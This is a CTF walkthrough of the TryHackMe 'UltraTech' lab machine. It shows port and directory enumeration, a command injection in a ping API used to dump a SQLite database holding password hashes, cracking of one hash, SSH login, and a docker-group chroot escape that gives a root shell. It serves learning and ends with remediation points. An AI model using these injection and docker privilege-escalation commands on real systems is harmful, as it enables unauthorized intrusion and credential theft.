# Target: UltraTech
**Platform:** [TryHackMe]
[UltraTech on TryHackMe](https://tryhackme.com/room/ultratech1)

| Target Name | IP Address | OS | Difficulty |
| :--- | :--- | :--- | :--- |
| UltraTech | 10.113.159.111 | Linux | Medium |

---

Before starting this machine I read the instruction givem by the author of this machine.
```
~_. UltraTech ._~

This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.

If you get stuck at some point, take some time to keep enumerating.



[ Your Mission ]

You have been contracted by UltraTech to pentest their infrastructure.

It is a grey-box kind of assessment, the only information you have

is the company's name and their server's IP address.

Start this room by hitting the "deploy" button on the right!



Good luck and more importantly, have fun!

__

Lp1 <fenrir.pro>



[ Extra Information ]

If you have any comment or question regarding this room, you can contact me on TryHackMe's Discord.
```

Here were crucial informations about the machine. There could be real misconfigurations on this machine that could help me.

## Phase 1: Reconnaissance & Enumeration

I started my reconnaissance by running the `nmap` scan on this machine. I used flags: `-sV` to check services running on each port and `-vv` to increase verbosity of the scanning porcess.
**Nmap Scan:**
```bash
nmap -sV -vv 10.113.159.111
```

```
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

This showed me only two ports open, these ports are communication ports. But this scan wasn't enough so I run another scan, but this time on all ports on this machine by adding flag: `-p`.
**Second Nmap Scan:**
```bash
nmap -sV -vv -p- 10.113.159.111
```

```
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 62 vsftpd 3.0.5
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    syn-ack ttl 62 Node.js Express framework
31331/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

This time I've got much more informations about the machine. There are 2 non-standard ports: `8081` with `Node.js Express framework`, and `31331` with `Apache httpd` server.
To find routes on `REST api` at port `8081` first I was searching on the web server on port `31331` but it doesn't giving me the anwser. Then I went to the page: (https://developer.wordpress.org/rest-api/extending-the-rest-api/routes-and-endpoints/). There I found that REST api routes are just directories names so I run the nmap directory finding attack on port `8081`, using `gobuster`.
**Directory Brute-forcing:**
```bash
gobuster dir -u http://10.113.159.111:8081 --wordlist /usr/share/dirb/wordlists/common.txt 
```

```
auth                 (Status: 200) [Size: 39]
ping                 (Status: 500) [Size: 1094]
Progress: 4613 / 4613 (100.00%)
```

This showed me that this api is using 2 routes.
While enumerating web server on port `31331` I found a basic web page with some subdirectories, but they seems to look normal and don't contain any interesting data, so I run the finding hidden directories attack on this web server.
**Directory Brute-Forcing:**
```bash
gobuster dir -u http://10.113.159.111:31331 --wordlist /usr/share/dirb/wordlists/common.txt 
```

```
.hta                 (Status: 403) [Size: 282]
.htaccess            (Status: 403) [Size: 282]
.htpasswd            (Status: 403) [Size: 282]
css                  (Status: 301) [Size: 323] [--> http://10.113.159.111:31331/css/]
favicon.ico          (Status: 200) [Size: 15086]
images               (Status: 301) [Size: 326] [--> http://10.113.159.111:31331/images/]
index.html           (Status: 200) [Size: 6092]
javascript           (Status: 301) [Size: 330] [--> http://10.113.159.111:31331/javascript/]
js                   (Status: 301) [Size: 322] [--> http://10.113.159.111:31331/js/]
robots.txt           (Status: 200) [Size: 53]
server-status        (Status: 403) [Size: 282]
```

I checked this directories but they looked normal. Directory `javascript` was blocked to me, but I brute-forced it to the end, and I found file to which I had access at: `/javascript/jquery/jquery` But file `robots.txt` had some interesting data inside, about the directories.
```robots.txt
/utech_sitemap.txt
```

This was hidden directory, so I moved to it.
```/utech_sitemap.txt
/
/index.html
/what.html
/partners.html
```

## Phase 2: Initial Foothold (Gaining Access)

There were three directories, first three was normal, found previous by scan, but the fourth one was different, I enered it and there was login page. I tried to login with default login credentials (`admin:password`) but it didn't wokred, but I gives me next interesting infromation. When the page showed me information: `Invalid credentials` the URL changed to: `http://10.113.159.111:8081/auth?login=admin&password=password`. So there is possibly easy way to brute-force login form by changing the URL.
This attack didn't help me.
I moved back to the enumeration phase and moved back to found file `/js/api.js` there was a script pinging the machine: const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`.
This URL showed me where to look for. I went to URL: `http://10.113.159.111:8081/ping` and added `?ping=` at the end to test if it works. First I type there a machine IP Address. And this lookedn like output of the normal ping command. So I tried to execute different command: `ls` there. But it didn't wokred so I tried different variations of this command and finally this one gives me what I was looking for: `http://10.113.159.111:8081/ping?ip='ls'`.
```
ping: utech.db.sqlite: Name or service not known
```

Next I read the content of this file with command: `cat utech.db.sqlite`.
```
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known
```

Knowing that firs username was: `r00t`, which was showed on the main page of the web server, his hash was: `f357a0c52799563c7c7b76c1e7543a32`. After having his hash I moved to page: `https://www.dcode.fr/md5-hash` and there I decoded the hash to the password: `n100906`.
I moved back to the login page and there I type captured login credentials and this is the message that I got:
```
Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
```

This login credentials also worked while logging to the SSH.
**Proof of r00t:**
```bash
r00t@ip-10-113-159-111:/home/ubuntu$ whoami
r00t
```
## Phase 3: Privilege Escalation & Post-Exploitation
I checked the current user id with command `id`.
```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

`r00t` user is in the docker group. I checked potential privilage escalation on GTFOBins with docker and there I found command: `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`.
I configured it to my machine: `docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh`. And run it, it spawned me a `root` shell, I upgraded it: `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

**Proof of root:**
```bash
root@eeb3a9aa76b5:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

Then I naviged to the location: `/root/.ssh` and there I found the ssh key.

## Conclusion & Takeaways

**Summary:** 
Completing this room started with full port range `Nmap` scan. Which showed non-standard ports for web server and api. While enumerating directoied it showed hidden directory with `js` scripts. One of them showed the place where it was possible to run Linux command form the URL. There was found database configuraton file, which contains hashes to r00t user. After encrytping this hash it was aviable to connect wit machine via `SSH`. Escalating privilages to the `root` was possible because of `r00t` user was part of the docker group. After finding payload which spawns shell via docker command, the `root` shell was spawned, where was found `ssh` key.
**What I Learned:**
- When nomral nmap scan don't show enough information about the machine, it's possible that full port range scan could give more informatios.
- Seemingly normal file, could contains information about initial foothold, like specific URL address, where it is possible to execute linux command.
- Allways check groups to which logged user belongs, because they could be used to escalate privileges.
**Remediation:** To secure this system and prevent simillar attacks, a system administrator should implement the following patches:
1. Block access to the `.js` files to the normal users.
2. Upgrade users password policies.
3. Remove `r00t` user docker command privileges.
